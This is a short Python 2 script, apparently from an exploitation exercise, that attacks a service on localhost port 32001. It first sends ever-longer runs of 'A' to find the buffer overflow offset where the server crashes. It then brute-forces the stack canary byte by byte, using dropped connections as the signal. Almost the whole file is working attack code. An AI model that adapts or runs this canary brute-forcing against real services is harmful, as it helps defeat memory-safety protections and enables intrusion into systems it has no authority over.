#!/usr/bin/python
import sys
import signal

from socket import *  
from struct import *  
import base64  
import time  
import string


bfBytes = []

def signal_handler(signal, frame):
	print ""
	print "Bytes: "
	for byte in bfBytes:
		sys.stdout.write( hex(byte) + " " )
	print ""
	sys.exit(0)


signal.signal(signal.SIGINT, signal_handler)

def bruteforceOffset(n):
	s = socket(AF_INET, SOCK_STREAM)
	#s.settimeout(0.5)
	s.connect(("localhost", 32001))

	payload = 'A' * n
	print ("Send " + str(n) + ": " + payload)

	s.send(payload)

	a = ""
	try:
		a = s.recv(2)
		if a == "":
			return True	
	except:
		return True
	finally: 
		s.close()

	return False


def bruteforceCanary(offset, n, canary):
	s = socket(AF_INET, SOCK_STREAM)
	s.settimeout(0.5)
	s.connect(("localhost", 32001))

	payload = 'A' * offset + canary + chr(n) 
	if isVerbose:
		print "Payload " + str(n) + ": " + payload

	s.send(payload)

	a = ""
	try:
		a = s.recv(2)
		if a == "":
			return False 
		else: 
			return True
	except:
		return True 
	finally: 
		s.close()

	return False


isVerbose = False

if len(sys.argv) > 1:
	if sys.argv[1] == "-v":
		isVerbose = True


n = 16 
while n < 32:
	try:
		ret = bruteforceOffset(n)
		if ret:
			print "Crash of server at offset: " + str(n)
			break
		n += 1
	except KeyboardInterrupt:
		signal_handler()

offset = n - 1 
print "Offset is: " + str(offset)
raw_input("Press Enter to continue...")

n = 0
canary = ""
while n < 256:
	ret = bruteforceCanary(offset, n, canary)
	if ret:
		canary = canary + chr(n)
		print "Found byte: " + hex(n)
		bfBytes.append(n)
		n = 0
		continue

	n += 1
